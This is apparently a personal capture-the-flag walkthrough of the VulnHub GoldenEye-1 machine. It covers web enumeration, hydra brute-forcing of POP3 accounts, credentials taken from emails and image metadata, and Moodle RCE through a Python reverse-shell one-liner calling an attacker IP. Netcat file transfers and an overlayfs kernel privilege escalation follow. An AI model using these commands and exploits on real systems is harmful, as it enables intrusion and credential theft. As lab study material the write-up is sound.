# Recon
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12]
└─# ffuf -u http://192.168.236.12/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php' -fw 21

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.236.12/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 21
________________________________________________

                        [Status: 200, Size: 252, Words: 10, Lines: 12]
index.html              [Status: 200, Size: 252, Words: 10, Lines: 12]
:: Progress: [18460/18460] :: Job [1/1] :: 5715 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```
- `index.html`
### Nikto
```
┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12]
└─#             nikto -ask=no -h http://192.168.236.12:80 2>&1 | tee "/root/vulnHub/GoldenEye-1/192.168.236.12/scans/tcp80/tcp_80_http_nikto.txt"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.236.12
+ Target Hostname:    192.168.236.12
+ Target Port:        80
+ Start Time:         2022-01-27 19:16:29 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: fc, size: 56aba821be9ed, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.24
+ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-01-27 19:17:22 (GMT8) (53 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
- `splashAdmin.php`
- `Cobalt Qube 3 admin`



# Initial Foothold
## TCP/80 - HTTP - Hidden Directory & Text
1. View to enumerated directories
	- `index.html`
		![](images/Pasted%20image%2020220128012756.png)
		- `sev-home`
		- `terminal.js`
	- `/sev-home`
		![](images/Pasted%20image%2020220127191911.png)
		- Basic Authentication
	- `terminal.js`
		![](images/Pasted%20image%2020220128020026.png)
		- Boris
			- Encoded password
			- Default password
	- `splashAdmin.php`
		![](images/Pasted%20image%2020220127192212.png)
		- List of users
			- boris/Boris
			- janus/Janus
			- admin/Admin
			- natalya/Natalya
			- xenia/Xenia
		- Cobalt Qube 3 has been decomissioned
2. Search exploits for `Cobalt Qube 3`

	| Exploit Title                           | Path                  |
	| --------------------------------------- | --------------------- |
	| Cobalt Qube 3.0 - Authentication Bypass | php/webapps/21640.txt |
	- Exploit did not work
3. Decode password
	![](images/Pasted%20image%2020220128013328.png)
	- boris:InvincibleHack3r
4. Proceed to `/sev-home` & login
	![](images/Pasted%20image%2020220128013555.png)
## TCP/55007 - POP3 - Bruteforce + Access Emails
1. Bruteforce POP3
	```
	┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/http]
	└─# hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://$ip:55007 -e nsr
	[DATA] attacking pop3://192.168.236.12:55007/
	[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
	[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
	[55007][pop3] host: 192.168.236.12   login: boris   password: secret1!
	```
	- boris:secret1!
2. Access SMTP w/ Thunderbird
	![](images/Pasted%20image%2020220128021954.png)
3. View boris's emails
	- `alec@janus.boss`
		![](images/Pasted%20image%2020220128022304.png)
		- No attached files
	- `natalya@ubuntu`
		![](images/Pasted%20image%2020220128022329.png)
	- `root@127.0.0.1.goldeneye`
		![](images/Pasted%20image%2020220128022354.png)
4. New users
	- alec
	- natalya
	- root
5. Bruteforce POP3 again 
	```
	┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/smtp]
	└─# hydra -L usernames.txt -P /usr/share/wordlists/fasttrack.txt pop3://$ip:55007 -e nsr -t 10
	[55007][pop3] host: 192.168.236.12   login: natalya   password: bird
	```
	- natalya:bird
6. View natalya's emails
	- root@ubuntu
		![](images/Pasted%20image%2020220128030727.png)
		- `severnaya-station.com/gnocertdir`
		- xenia:RCP90rulez!

## Back to TCP/80 - Obtain More Creds
1. Add `severnaya-station.com` to `/etc/hosts`
	```
	┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/cobalt]
	└─# echo "192.168.236.12 severnaya-station.com" >> /etc/hosts
	```
2. Proceed to `/gnocertdir`
	![](images/Pasted%20image%2020220128032828.png)
	- Login w/ xenia:RCP90rulez!
	- moodle
3. Search for moodle version
	![](images/Pasted%20image%2020220128032912.png)
	- [Source](https://moodle.org/mod/forum/discuss.php?d=149771) 
	- Moodle >1.9.7
4. Search for exploits

	| Exploit Title                                            | Path                  |
	| -------------------------------------------------------- | --------------------- |
	| Moodle 3.8 - Unrestricted File Upload (2019)                   | php/webapps/49114.txt |
	| Moodle 3.9 - Remote Code Execution (RCE) (Authenticated) (2021) | php/webapps/50180.py  |
	| Moodle 3.4.1 - Remote Code Execution                     | php/webapps/46551.php |
	| Moodle 2.x/3.x - SQL Injection                           |                 php/webapps/41828.php      | 
	- None of the exploits worked
5. View xenia's messages
	![](images/Pasted%20image%2020220128040628.png)
	- doak

## Back to TCP/55007 - POP3
1. Bruteforce POP3 again
	```
	┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/smtp]
	└─# hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://$ip:55007 -e nsr -t 10 -I
	
	[55007][pop3] host: 192.168.236.12   login: doak   password: goat
	```
	- doak:goat
2. View doak's emails
	- `doak@ubuntu`
	![](images/Pasted%20image%2020220128041618.png)
	- dr_doak:4England!

## Back to TCP/80 - Obtain More Creds + Moodle CMS Exploit (RCE) 
1. Login w/ dr_doak:4England! & proceed to private files
	![](images/Pasted%20image%2020220128042228.png)
2. View `s3cret.txt`
	![](images/Pasted%20image%2020220128042353.png)
	- /dir007key/for-007.jpg
3. Download  `/dir007key/for-007.jpg` 
4. Detect any hidden files/text
	```
	┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/loot/http]
	└─# exiftool for-007.jpg | grep Description
	Image Description               : eFdpbnRlcjE5OTV4IQ==
	```
5. Decode text
	```
	┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/loot/http]
	└─# echo -n eFdpbnRlcjE5OTV4IQ== | base64 -d
	xWinter1995x!
	```
	- admin:xWinter1995x!
6. Login w/ admin:xWinter1995x!
	- No Private Files
	- No Messages
7. View moodle version
	![](images/Pasted%20image%2020220128043224.png)
	- `moodle 2.2.3`
8. Insert reverse shell
	1. Proceed to `Site Administration -> Server -> System Paths`
	2. Edit Path to aspell
		```
		python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.236.4",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
		```
		- Only python reverse shell worked
		
	3. Proceed to `Site Administration -> Plugins -> Text Editor -> TinyMCE editor`
	4. Change Spell engine to `PSpellShell`
		![](images/Pasted%20image%2020220128051240.png)
	5. Execute reverse shell by creating a post & toggling spell check
		![](images/Pasted%20image%2020220128052620.png)
9. Obtain www-data shell
	![](images/Pasted%20image%2020220128052926.png)
10. Credentials we have so far

	| Username | Password         |
	| -------- | ---------------- |
	| boris    | InvincibleHack3r |
	| boris    | secret1!         |
	| natalya  | bird             |
	| xenia    | RCP90rulez!      |
	| doak     | goat             |
	| dr_doak  | 4England!        |
	| admin    | xWinter1995x!    |
	| alec     | ?                 |



# Privilege Escalation
## Rabbit Hole - SQL Creds
1. Obtain usernames
2. Obtain MySQL creds
	![](images/Pasted%20image%2020220128154514.png)
	- moodle:trevelyan006x
	- It uses psql instead of mysql
3. Access psql
	```
	www-data@ubuntu:/home$ psql -U moodle -h 127.0.0.1 moodle
	Password for user moodle: 
	psql (9.3.22)
	SSL connection (cipher: DHE-RSA-AES256-GCM-SHA384, bits: 256)
	Type "help" for help.

	moodle=> \l
									  List of databases
	   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
	-----------+----------+----------+-------------+-------------+-----------------------
	 moodle    | moodle   | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
	 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
	 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
			   |          |          |             |             | postgres=CTc/postgres
	 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
			   |          |          |             |             | postgres=CTc/postgres
	
	moodle=> \c moodle
	SSL connection (cipher: DHE-RSA-AES256-GCM-SHA384, bits: 256)
	You are now connected to database "moodle" as user "moodle".
	
	moodle=> SELECT username, password FROM mdl_user;
	 guest    | aca21c6dbd0538a171ff16550b873d70
	 boris    | efaf365b88dee2fc2029ff20674658a7
	 natalya  | 7a442035ba13c5d22e1e163e2117eb0d
	 xenia    | 116672a0e281b6aa277ef78f53a5f6f9
	 dr_doak  | 488e0292fac2386d877e80f2e3a203bf
	 admin    | de51800b0404d41fcb51203f1e3e524a
	```
4. Crack hashes
	```
	┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/loot/sql]
	└─# cut -d "|" -f2 sqlcreds | cut -d " " -f2 > hashes

	┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/loot/sql]
	└─# hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt  --show
	```
	- Failed to crack

	
## Root - Via Kernel Exploit
1. Linpeas
	![](images/Pasted%20image%2020220128164432.png)
2. Find exploit for `linux 3.13.0-32`

	| Exploit Title                                                                                                             | Path                  |
	| ------------------------------------------------------------------------------------------------------------------------- | --------------------- |
	| Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                      | linux/local/37292.c   |
	| Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow) | linux/local/37293.txt |
3. Use `linux/local/37292.c`
4. Since we do not have gcc on the target, we have to compile on our kali
	1. Compile `37292.c` on kali
		```
		┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1]
		└─# gcc -m64 37292.c -o exploit
		```
	2. Transfer to target
		```
		┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1]
		└─# nc -nvlp 4444 < exploit 
		Ncat: Version 7.92 ( https://nmap.org/ncat )
		Ncat: Listening on :::4444
		Ncat: Listening on 0.0.0.0:4444
		
		www-data@ubuntu:/tmp/kernel_exploit$ nc 192.168.236.4 4444 > exploit
		```
	3. Run exploit on target
		```
		www-data@ubuntu:/tmp/kernel_exploit$ ./exploit
		spawning threads
		mount #1
		mount #2
		child threads done
		/etc/ld.so.preload created
		creating shared library
		sh: 1: gcc: not found
		couldn't create dynamic library
		www-data@ubuntu:/tmp/kernel_exploit$ 
		```
		- `/etc/ld.so.preload` is created on target
		- `/tmp/ofs-lib.c` is created on target
	3.  Transfer `/tmp/ofs-lib.c` to kali
		```
		┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1]
		└─# nc -nvlp 4444 > ofs-lib.c
		Ncat: Version 7.92 ( https://nmap.org/ncat )
		Ncat: Listening on :::4444
		Ncat: Listening on 0.0.0.0:4444
		
		www-data@ubuntu:/tmp/kernel_exploit$ nc 192.168.236.4 4444 < /tmp/ofs-lib.c
		```
	4.  Compile `/tmp/ofs-lib.c` on kali
		```
		gcc -m64 -fPIC -shared -o ofs-lib.so ofs-lib.c -ldl -w
		```
	5. Remove `Line 138-147` from `37292.c`
		![](images/Pasted%20image%2020220128170136.png)
	6. Recompile `37292.c`
		```
		┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1]
		└─# rm exploit 
		
		┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1]
		└─# gcc -m64 37292.c -o exploitNew
		37292.c: In function ‘main’:
		...
		```
	7. Transfer `exploitNew` & `ofs-lib.so` to target
		```
		# Transfer ofs-lib.so
		┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1]
		└─# nc -nvlp 4444 < ofs-lib.so
		Ncat: Version 7.92 ( https://nmap.org/ncat )
		Ncat: Listening on :::4444
		Ncat: Listening on 0.0.0.0:4444
		
		www-data@ubuntu:/tmp/kernel_exploit$ nc 192.168.236.4 4444 > /tmp/ofs-lib.so
		
		# Transfer exploitNew
		┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1]
		└─# nc -nvlp 4444 < exploitNew
		Ncat: Version 7.92 ( https://nmap.org/ncat )
		Ncat: Listening on :::4444
		Ncat: Listening on 0.0.0.0:4444

		www-data@ubuntu:/tmp/kernel_exploit$ nc 192.168.236.4 4444 > exploitNew

		```
	6. Run exploit on target again
		```
		chmod +x exploitNew
		./exploitNew
		```
		![](images/Pasted%20image%2020220128172433.png)
	7. Root Flag
		```
		# cat .flag.txt
		Alec told me to place the codes here: 

		568628e0d993b1973adc718237da6e93

		If you captured this make sure to go here.....
		/006-final/xvf7-flag/

		# 
		```
		![](images/Pasted%20image%2020220128172612.png)
	8. After reading writeups, you can just change `gcc` to `cc` in `37292.c`



---
Tags: #tcp/110-pop3/bruteforce #tcp/80-http/web-app-cms-exploit #tcp/80-http/rce  #linux-priv-esc/kernel-exploit  

---
